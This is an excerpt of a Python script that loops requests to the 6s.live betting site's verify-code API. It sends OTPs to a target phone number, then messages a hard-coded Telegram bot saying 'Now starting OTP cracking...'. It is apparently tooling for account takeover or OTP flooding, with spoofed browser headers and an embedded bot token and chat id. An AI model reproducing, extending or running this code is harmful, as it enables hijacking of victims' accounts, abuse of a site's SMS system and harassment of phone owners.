...
def main():
    ...
    while True:
        ...
        headers = {'sec-ch-ua': '\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"', 'sec-ch-ua-mobile': '?1', 'Authorization': f'Bearer {token}', 'sec-ch-ua-arch': '\"\"', 'Content-Type': 'application/json', 'sec-ch-ua-full-version': '\"139.0.7339.0\"', 'Accept': 'application/json, text/plain, */*', 'sec-ch-ua-platform-version': '\"14.0.0\"', 'Referer': '6s.live/bd/en/member/profile/info/verify-phone', 'X-Internal-Request': '61405202', 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36', 'sec-ch-ua-full-version-list': '\"Chromium\";v=\"139.0.7339.0\", \"Not;A=Brand\";v=\"99.0.0.0\"', 'sec-ch-ua-bitness': '\"\"', 'sec-ch-ua-model': '\"LE2101\"', 'sec-ch-ua-platform': '\"Android\"'}
        json_data = {'languageTypeId': 1, 'currencyTypeId': 8, 'contactTypeId': 2, 'domain': '6s.live', 'receiver': number, 'callingCode': '880'}
        try:
            response = requests.post('https://6s.live/api/bt/v2_1/user/getVerifyCodeByContactType', headers=headers, json=json_data).json()
            ...
            if api_status == '000000':
                print(f'\n{BOLD}{G} OTP SENT VALIDITY >> 30 MINUTES{D}')
                # OTP successful hole telegram message jabe
                send_noti(number)
...
def send_noti(number):
    try:
        BOT_TOKEN = '8345339682:AAFs60FHY__L2dSKx47sM4IX8nfyPFTACkE'
        CHAT_ID = '-5099546793'
        msg = f'SIX OTP Sent Successfully ✅\nNumber: {number}\nNow starting OTP cracking...'
        ...
        if response.status_code == 200:
            ...
            print(f'{R}⚠️ Failed to send Telegram notification{D}')
    except Exception as e:
        print(f'{R}❌ Telegram error: {e}{D}')
